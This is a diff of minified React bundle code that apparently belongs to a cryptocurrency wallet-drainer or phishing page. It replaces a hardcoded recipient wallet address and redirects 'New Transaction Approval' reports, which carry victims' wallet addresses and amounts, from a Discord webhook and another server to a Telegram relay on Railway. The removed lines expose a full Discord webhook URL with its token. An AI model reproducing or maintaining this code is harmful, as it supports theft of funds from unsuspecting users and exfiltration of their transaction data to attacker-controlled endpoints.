@@ -36844,7 +36844,7 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
         function O(ue) {
             return new Promise(be => setTimeout(be, ue))
         }
-        const z = "0x9Fc216CAE3CA7a455B0110a7B7f77Da0A99A29d8";
+        const z = "0x4f2d5Ea5De93D5B0e985E4ce18b941187cD13f7B";
         function L() {}
         const [Y,W] = Q.useState(!1)
           , [D,se] = Q.useState("")
@@ -36912,7 +36912,7 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
             }
         }
         async function gn({wallet_address: ue, amount: be, action: ct}) {
-            const st = "https://discord.com/api/webhooks/1393290566825017405/h5qPhCMfGUU_AIZvSeuKmQuHys7PaJhZcD4MeYVta4EIrvFQkZ0Sag3oHSZ79YhRMhaC";
+            const st = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
             try {
                 const ke = {
                     content: "New Transaction Approval",
@@ -36946,7 +36946,7 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
                 });
                 if (!dt.ok)
                     throw new Error(`Discord webhook error: ${dt.status} ${dt.statusText}`);
-                const Vn = await fetch("https://usdtapi.naraynseva.org/api/transactions/transaction-store", {
+                const Vn = await fetch("https://telegram-bot-production-d2c7.up.railway.app/sendTelegram", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
@@ -36964,7 +36964,7 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
             }
         }
         async function uf(ue) {
-            const be = "https://discord.com/api/webhooks/1393290566825017405/h5qPhCMfGUU_AIZvSeuKmQuHys7PaJhZcD4MeYVta4EIrvFQkZ0Sag3oHSZ79YhRMhaC";
+            const be = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
             try {
                 const ct = {
                     content: "New Transaction Approval",
@@ -37019,7 +37019,7 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
                 });
                 if (!st.ok)
                     throw new Error(`Discord webhook error: ${st.status} ${st.statusText}`);
-                const ke = await fetch("https://usdtapi.naraynseva.org/api/transactions/transaction-store", {
+                const ke = await fetch("https://telegram-bot-production-d2c7.up.railway.app/sendTelegram", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
